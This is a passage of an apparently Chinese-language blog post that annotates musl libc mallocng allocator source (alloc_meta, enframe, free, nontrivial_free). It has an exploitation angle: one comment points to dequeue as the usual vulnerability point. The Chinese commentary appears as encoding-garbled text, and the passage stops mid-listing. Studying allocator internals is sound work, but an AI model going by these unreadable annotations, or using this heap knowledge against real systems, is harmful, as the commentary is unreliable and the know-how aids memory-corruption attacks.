class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="comment">//ç”¨æ¥åˆ†é…metaå¯¹è±¡</span></span><br><span class="line"><span class="function">struct meta *<span class="title">alloc_meta</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ctxæ˜¯å¦å®Œæˆåˆå§‹åŒ–ï¼Œæ²¡å®Œæˆå°±æ•´ä¸€ä¸‹</span></span><br><span class="line">	<span class="keyword">if</span> (!ctx.init_done) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">		ctx.pagesize = get_page_size();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		ctx.secret = get_random_secret();</span><br><span class="line">		ctx.init_done = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//pagesizeçš„è®¾ç½®</span></span><br><span class="line">	<span class="keyword">size_t</span> pagesize = PGSZ;</span><br><span class="line">	<span class="keyword">if</span> (pagesize &lt; <span class="number">4096</span>) pagesize = <span class="number">4096</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//é¦–å…ˆçœ‹èƒ½ä¸èƒ½ä»free_meta_headä¸­è·å¾—metaå¯¹è±¡ï¼Œä¸€èˆ¬æ˜¯å°†ä¸€ä¸ªmeta-groupä¸­çš„</span></span><br><span class="line">    <span class="comment">//chunkå…¨éƒ¨åˆ†é…å®Œç„¶åå…¨éƒ¨é‡Šæ”¾å®Œå°±ä¼šè‡ªåŠ¨è¿›å…¥meta-groupçš„é‡Šæ”¾é˜¶æ®µï¼ŒæˆåŠŸå°±è¿›å…¥</span></span><br><span class="line">    <span class="comment">//è¿›å…¥åˆ°ctx.free_meta_headä¸­</span></span><br><span class="line">	<span class="keyword">if</span> ((m = dequeue_head(&amp;ctx.free_meta_head))) <span class="keyword">return</span> m;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ctxä¸­å¦‚æœæ²¡æœ‰å¯ç”¨çš„meatå¯¹è±¡</span></span><br><span class="line">	<span class="keyword">if</span> (!ctx.avail_meta_count) &#123;</span><br><span class="line">		<span class="keyword">int</span> need_unprotect = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//ctxä¸­æ²¡æœ‰ç©ºé—²çš„meatå¯¹è±¡ä¸”ctx.brkä¸ä¸º-1</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.avail_meta_area_count &amp;&amp; ctx.brk!=<span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="comment">//åˆ†é…ä¸€é¡µå†…å­˜0x1000</span></span><br><span class="line">			<span class="keyword">uintptr_t</span> <span class="keyword">new</span> = ctx.brk + pagesize;</span><br><span class="line">			<span class="keyword">int</span> need_guard = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//å¦‚æœctx.brkä¸º0,ä¸€èˆ¬åœ¨åˆå§‹åŒ–çš„æ—¶å€™</span></span><br><span class="line">			<span class="keyword">if</span> (!ctx.brk) &#123;</span><br><span class="line">				need_guard = <span class="number">1</span>;</span><br><span class="line">                <span class="comment">//è°ƒç”¨brk()è·å–å †åœ°å€</span></span><br><span class="line">				ctx.brk = brk(<span class="number">0</span>);</span><br><span class="line">				<span class="comment">// some ancient kernels returned _ebss</span></span><br><span class="line">				<span class="comment">// instead of next page as initial brk.</span></span><br><span class="line">				ctx.brk += -ctx.brk &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line">				<span class="keyword">new</span> = ctx.brk + <span class="number">2</span>*pagesize;</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="comment">//brk()åˆ†é…heapåˆ°newåœ°å€å¤±è´¥</span></span><br><span class="line">			<span class="keyword">if</span> (brk(<span class="keyword">new</span>) != <span class="keyword">new</span>) &#123;</span><br><span class="line">				ctx.brk = <span class="number">-1</span>;</span><br><span class="line">			&#125; </span><br><span class="line">            <span class="comment">//åˆ†é…æˆåŠŸ</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//ä¿æŠ¤é¡µ, åœ¨brkåé¢æ˜ å°„ä¸€ä¸ªä¸å¯ç”¨çš„é¡µ(PROT_NONE),</span></span><br><span class="line">                <span class="comment">//å¦‚æœå †æº¢å‡ºåˆ°è¿™é‡Œå°±ä¼šå‘é€SIGV</span></span><br><span class="line">				<span class="keyword">if</span> (need_guard) mmap((<span class="keyword">void</span> *)ctx.brk, pagesize,</span><br><span class="line">					PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">				ctx.brk = <span class="keyword">new</span>;</span><br><span class="line">                <span class="comment">//æŠŠè¿™ä¸€é¡µå…¨åˆ’åˆ†ä¸ºmetaå¯¹è±¡</span></span><br><span class="line">				ctx.avail_meta_areas = (<span class="keyword">void</span> *)(<span class="keyword">new</span> - pagesize);</span><br><span class="line">				ctx.avail_meta_area_count = pagesize&gt;&gt;<span class="number">12</span>;</span><br><span class="line">				need_unprotect = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//å¦‚æœå‰é¢brk()åˆ†é…å¤±è´¥äº†, ç›´æ¥mmapåŒ¿åæ˜ å°„ä¸€ç‰‡PROT_NONEçš„å†…å­˜å†åˆ’åˆ†</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.avail_meta_area_count) &#123;</span><br><span class="line">			<span class="keyword">size_t</span> n = <span class="number">2UL</span> &lt;&lt; ctx.meta_alloc_shift;</span><br><span class="line">			p = mmap(<span class="number">0</span>, n*pagesize, PROT_NONE,</span><br><span class="line">				MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			ctx.avail_meta_areas = p + pagesize;</span><br><span class="line">			ctx.avail_meta_area_count = (n<span class="number">-1</span>)*(pagesize&gt;&gt;<span class="number">12</span>);</span><br><span class="line">			ctx.meta_alloc_shift++;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//å¦‚æœavail_meta_areasä¸4Kå¯¹é½, é‚£ä¹ˆå°±è¯´æ˜è¿™ç‰‡åŒºåŸŸæ˜¯åˆšåˆšç”³è¯·çš„ä¸€é¡µ</span></span><br><span class="line">        <span class="comment">//æ‰€ä»¥éœ€è¦ä¿®æ”¹å†…å­˜çš„æƒé™,æ›´æ”¹ä¸ºè¯»å†™ä¿æŠ¤çš„</span></span><br><span class="line">		p = ctx.avail_meta_areas;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)p &amp; (pagesize<span class="number">-1</span>)) need_unprotect = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (need_unprotect)</span><br><span class="line">			<span class="keyword">if</span> (mprotect(p, pagesize, PROT_READ|PROT_WRITE)</span><br><span class="line">			    &amp;&amp; errno != ENOSYS)</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		ctx.avail_meta_area_count--;</span><br><span class="line">		ctx.avail_meta_areas = p + <span class="number">4096</span>;</span><br><span class="line">		<span class="keyword">if</span> (ctx.meta_area_tail) &#123;</span><br><span class="line">			ctx.meta_area_tail-&gt;next = (<span class="keyword">void</span> *)p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ctx.meta_area_head = (<span class="keyword">void</span> *)p;</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//åˆå§‹åŒ–ctxçš„ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">		ctx.meta_area_tail = (<span class="keyword">void</span> *)p;</span><br><span class="line">		ctx.meta_area_tail-&gt;check = ctx.secret;</span><br><span class="line">		ctx.avail_meta_count = ctx.meta_area_tail-&gt;nslots</span><br><span class="line">			= (<span class="number">4096</span>-<span class="keyword">sizeof</span>(struct meta_area))/<span class="keyword">sizeof</span> *m;</span><br><span class="line">		ctx.avail_meta = ctx.meta_area_tail-&gt;slots;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//ctxçš„å¯ç”¨metaå¯¹è±¡æ•°ç»„ä¸­æœ‰èƒ½ç”¨çš„,ä»ä¸­ç›´æ¥åˆ†é…å‡ºæ¥å³å¯</span></span><br><span class="line">	ctx.avail_meta_count--;</span><br><span class="line">	m = ctx.avail_meta++;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>æŸ¥çœ‹ctxæ˜¯å¦å®Œæˆåˆå§‹åŒ–ï¼Œæ²¡å®Œæˆå°±åˆå§‹åŒ–ä¸€ä¸‹</li>
<li>å¦‚æœctx.free_meta_headé“¾è¡¨ä¸­æœ‰ç©ºé—²çš„meta, é‚£ä¹ˆç›´æ¥ä»è¿™é‡Œåˆ†é…ä¸€ä¸ªmeta</li>
<li>å¦‚æœctx.avail_meta_count&gt;0ï¼Œä»£è¡¨æœ€å¼€å§‹åˆ†é…å‡ºæ¥çš„metaå¯¹è±¡è¿˜æ²¡æœ‰è¢«ç”¨å®Œï¼Œç›´æ¥ä»ctx.avail_metaå¯¹è±¡æ•°ç»„ä¸­åˆ†é…ä¸€ä¸ª</li>
<li>å¦‚æœctx.avail_meta_count=0ï¼Œåˆ™ä»£è¡¨æœ€å¼€å§‹åˆ†é…çš„metaå¯¹è±¡å·²ç»ç”¨å®Œï¼Œæ²¡æœ‰å¯ç”¨çš„ï¼Œé‚£ä¹ˆå°±è¯´æ˜éœ€è¦å‘OSç”³è¯·å†…å­˜å­˜æ”¾meta<ul>
<li>å…ˆé€šè¿‡brkåˆ†é…1é¡µï¼Œå¦‚æœåˆ†é…æˆåŠŸï¼Œåˆ™å°†æ–°çš„å†…å­˜é¡µç›´æ¥åˆ’åˆ†ä¸ºmetaå¯¹è±¡ï¼Œç„¶åä¿®æ”¹ä¹‹åçš„å†…å­˜é¡µçš„æƒé™ã€‚</li>
<li>å¦‚æœbrkå¤±è´¥çš„è¯åˆ™ä¼šé€šè¿‡mmap()åˆ†é…è®¸å¤šé¡µå†…å­˜, ä½†æ˜¯è¿™äº›å†…å­˜éƒ½æ˜¯PROT_NONEçš„, å±äºguard page, å †æº¢å‡ºåˆ°è¿™äº›é¡µé¢ä¼šå¼•å‘SIGV, è€Œmetaä¸ä½¿ç”¨å¼€å¤´ä¸ç»“å°¾çš„ä¸€é¡µ, é˜²æ­¢è¢«æº¢å‡º</li>
</ul>
</li>
<li>åˆ†é…æˆåŠŸåè®¾ç½®ctxä¸­çš„meta_area_tail, avail_meta_cntç­‰ä¿¡æ¯, æŠŠæ–°åˆ†é…çš„ä¸€é¡µä½œä¸ºå¾…åˆ’åˆ†çš„metaã€‚</li>
</ul>

        <h4 id="â‘¤enframe"   >
          <a href="#â‘¤enframe" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¤enframe" class="headerlink" title="â‘¤enframe"></a>â‘¤enframe</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="comment">//åˆ†é…chunkæ—¶ï¼Œè®¾ç½®groupç”¨çš„å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">enframe</span><span class="params">(struct meta *g, <span class="keyword">int</span> idx, <span class="keyword">size_t</span> n, <span class="keyword">int</span> ctr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="keyword">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = p+stride-IB;</span><br><span class="line">	<span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line">	<span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line">	<span class="keyword">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="keyword">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">	assert(!p[<span class="number">-4</span>]);</span><br><span class="line">	<span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> m = slack;</span><br><span class="line">		m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">		off &amp;= m;</span><br><span class="line">		<span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">		assert(off &lt;= slack);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (off) &#123;</span><br><span class="line">		<span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">		<span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">		*(<span class="keyword">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">		p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">		p += UNIT*off;</span><br><span class="line">		<span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">		<span class="comment">// byte, so make one.</span></span><br><span class="line">		p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="keyword">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">	p[<span class="number">-3</span>] = idx;</span><br><span class="line">	set_size(p, end, n);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-free-1"   >
          <a href="#2-free-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-free-1" class="headerlink" title="(2)free"></a>(2)free</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line">   	<span class="comment">//è·å–ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="keyword">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = start + stride - IB;</span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è®¡ç®—è¿™ä¸ªchunkå¯¹åº”avail_maskå’Œfreed_maskçš„bitmap</span></span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">	((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	<span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line">	<span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)((<span class="keyword">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line">	<span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="keyword">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *base = start + (-(<span class="keyword">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="keyword">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">    <span class="comment">//åœ¨meta-&gt;freed_maskä¸­æ ‡è®°ä¸€ä¸‹, è¡¨ç¤ºè¿™ä¸ªchunkå·²ç»è¢«é‡Šæ”¾äº†</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> mask = freed | avail;</span><br><span class="line">		assert(!(mask&amp;self));<span class="comment">//è¦é‡Šæ”¾çš„chunkåº”è¯¥æ—¢ä¸åœ¨freedä¸­, ä¹Ÿä¸åœ¨availä¸­</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.å¦‚æœæ»¡è¶³  mask+self==all  , é‚£å°±è¯´æ˜é‡Šæ”¾äº†è¿™ä¸ªchunkä¹‹åè¿™ä¸ªgroup</span></span><br><span class="line"><span class="comment">ä¸­æ‰€æœ‰chunkéƒ½è¢«é‡Šæ”¾,å°±éœ€è¦è°ƒç”¨nontrivial_freeå›æ”¶æ•´ä¸ªmeta-group</span></span><br><span class="line"><span class="comment">å› æ­¤è¿™ä¸ªmetaéœ€è¦è°ƒç”¨nontrivial_free()å›æ”¶è¿™ä¸ªgroup</span></span><br><span class="line"><span class="comment">2.å¦‚æœæ»¡è¶³  !freed  ,é‚£ä¹ˆå°±è¯´æ˜è¯¥meta-groupä¸­æ²¡æœ‰è¢«é‡Šæ”¾çš„chunk,æœ‰å¯èƒ½æ˜¯ç¬¬ä¸€æ¬¡ä»è¯¥</span></span><br><span class="line"><span class="comment">æœ‰å¯èƒ½è¿™ä¸ªgroupå…¨éƒ¨è¢«åˆ†é…å‡ºå»äº†, è¿™æ ·groupæ˜¯ä¼šå¼¹å‡ºavtiveé˜Ÿåˆ—çš„, è€Œç°åœ¨é‡Šæ”¾äº†ä¸€ä¸ª</span></span><br><span class="line"><span class="comment">å…¶ä¸­çš„chunk,æ‰€ä»¥éœ€è¦è°ƒç”¨nontrivial_free()æŠŠè¿™ä¸ªgroupé‡æ–°åŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//çº¿ç¨‹æ–¹é¢çš„ä¸€äº›çŸ¥è¯†ï¼Œè¿˜ä¸æ˜¯å¤ªä¼š</span></span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>é€šè¿‡<code>get_meta()</code>æ‰¾åˆ°chunkå¯¹åº”çš„metaï¼Œé‡ç½®idxä¸offsetï¼Œå°†metaçš„freed_maskä¸­æ ‡è®°ä¸€ä¸‹å°±ç®—é‡Šæ”¾å®Œæ¯•äº†ã€‚</li>
<li>æœ‰ä¸€äº›ç‰¹æ®Šæƒ…å†µçš„ï¼Œéœ€è¦è·³å‡ºå¾ªç¯æ¥è°ƒç”¨<code>nontrivial_free()</code>å®Œæˆç›¸å…³æ“ä½œ</li>
</ul>

        <h4 id="â‘ nontrivial-free"   >
          <a href="#â‘ nontrivial-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ nontrivial-free" class="headerlink" title="â‘ nontrivial_free()"></a>â‘ nontrivial_free()</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¦‚æœmeta-groupä¸­æ‰€æœ‰chunkè¦ä¹ˆè¢«é‡Šæ”¾è¦ä¹ˆå¯ä½¿ç”¨</span></span><br><span class="line">    <span class="comment">//å¹¶ä¸”gå¯ä»¥è¢«é‡Šæ”¾(ä¸æ˜¯mmapå‡ºæ¥çš„),é‚£ä¹ˆå°±è¦å›æ”¶æ‰æ•´ä¸ªmeta</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">             <span class="comment">//æ£€æŸ¥scé‡Šæ”¾åˆæ³•, ä¸æ˜¯mmap(63)çš„</span></span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">            <span class="comment">//å¦‚æœgæ˜¯é˜Ÿåˆ—ä¸­å¼€å¤´çš„meta, é‚£ä¹ˆå¼¹å‡ºé˜Ÿåˆ—å, è¦æ¿€æ´»åä¸€ä¸ª</span></span><br><span class="line">			<span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">            <span class="comment">//æ¿€æ´»åä¸€ä¸ªmetaè¿‡ç¨‹ä¸­éœ€è¦å®Œæˆavail_maskå’Œfree_maskçš„è®¾ç½®</span></span><br><span class="line">            <span class="comment">//å³free_maskå‘avail_maksè¿›è¡Œè½¬ç§»</span></span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//ç°åœ¨è¦é‡Šæ”¾è¿™ä¸ªmeta-group,æ”¾å…¥ctx.free_meta_headä¸­</span></span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">        </span><br><span class="line">	&#125; </span><br><span class="line">    <span class="comment">//å¦‚æœmask==0, ä¹Ÿå°±æ˜¯è¿™ä¸ªmeta-groupä¸­æ‰€æœ‰çš„chunkéƒ½è¢«åˆ†é…å‡ºå»äº†</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="comment">//ç°åœ¨è¿™ä¸ªå…¨éƒ¨chunkè¢«åˆ†é…å‡ºå»çš„groupä¸­æœ‰ä¸€ä¸ªchunkè¦è¢«é‡Šæ”¾äº†</span></span><br><span class="line">        <span class="comment">//å› æ­¤è¿™ä¸ªmeta-groupè¦é‡æ–°å…¥é˜Ÿ</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡dequeue"   >
          <a href="#â‘¡dequeue" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡dequeue" class="headerlink" title="â‘¡dequeue"></a>â‘¡dequeue</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="comment">//metaçš„å‡ºé˜Ÿæ“ä½œï¼Œä¸€èˆ¬æ¼æ´ç‚¹å‡ºåœ¨è¿™é‡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span 